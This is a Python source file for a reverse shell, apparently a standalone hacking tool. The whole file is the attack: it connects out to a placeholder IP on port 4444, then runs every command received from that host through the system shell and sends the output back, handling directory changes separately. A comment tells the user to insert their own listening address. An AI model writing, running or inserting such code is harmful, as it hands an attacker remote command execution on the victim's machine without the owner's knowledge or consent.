#!/usr/bin/env python3

import socket
import subprocess
import os


def execute_system_command(command):
    return subprocess.check_output(command, shell=True, encoding='CP866', timeout=5)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(('111.111.111.111', 4444)) #input your ip in listening port. check readme for more information

connection.send(b'\n[*] Connection established.\n')

while True:
    command = connection.recv(1024).decode()[:-1]
    if command[:5] == 'chdir':
        os.chdir(command[6:])
        connection.send(b'\n[*] Directory changed to ' + bytes(command[6:], encoding='utf-8') + b'\n\n')
    try:
        command_result = execute_system_command(command)
        connection.send(bytes(command_result, encoding='utf-8'))
    except subprocess.TimeoutExpired:
        connection.send(b'\n[*] The command is executed\n\n')
        continue
